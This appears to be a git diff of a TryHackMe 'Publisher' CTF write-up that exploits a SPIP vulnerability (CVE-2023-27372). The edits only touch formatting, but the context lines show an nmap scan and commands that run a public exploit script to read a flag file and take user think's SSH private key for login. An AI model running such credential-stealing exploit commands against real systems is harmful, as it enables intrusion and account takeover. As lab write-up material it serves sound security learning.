@@ -14,7 +14,7 @@ tags:
     CVE-2023-27372,
     shebang,
   ]
-categories: [TryHackMe, Writeup]
+categories: [TryHackMe, Writeup, CTF, Easy]
 redirect_from: /2024/07/25/publisher/
 ---
 
@@ -29,8 +29,8 @@ As always we have to know what is in front of us:
 ```bash
 nmap -Pn TARGET_MACHINE_IP -oN ports && nmap -Pn -sC -sV -p $(grep -Po '.*(?=/tcp)' ports | tr '\n' ',') TARGET_MACHINE_IP -oN services
 ```
+{: .nolineno}
 
-<!--more-->
 
 This scan reveals only two ports:
 
@@ -71,7 +71,7 @@ I've changed the script by adding this line to the `send_payload` function, righ
 ```python
 print(r.content)
 ```
-
+{: .nolineno}
 
 After that I just run the script as it was. But the result is not as handy as I wish for...
 
@@ -83,6 +83,7 @@ Playing around with [regex101](https://regex101.com), I was able to create a she
 ```shell
 python ./51536.py -u "http://$target/spip" -c "cat /home/think/user.txt" | ggrep -Po '(?<=value\\="s\\:[0-9]{2}:\\")[^";]*' | awk '{gsub(/\\\n/,"\n")}1'
 ```
+{: .nolineno}
 
 Result:
 
@@ -101,6 +102,7 @@ To get ssh access, I just copied the ssh private key of user `think` to my local
 ```shell
 python ./51536.py -u "http://$target/spip" -c "cat /home/think/.ssh/id_rsa" | ggrep -Po '(?<=value\\="s\\:[0-9]{2}:\\")[^";]*' | awk '{gsub(/\\\n/,"\n")}1' > think_pk
 ```
+{: .nolineno}
 
 And ssh into it!
 
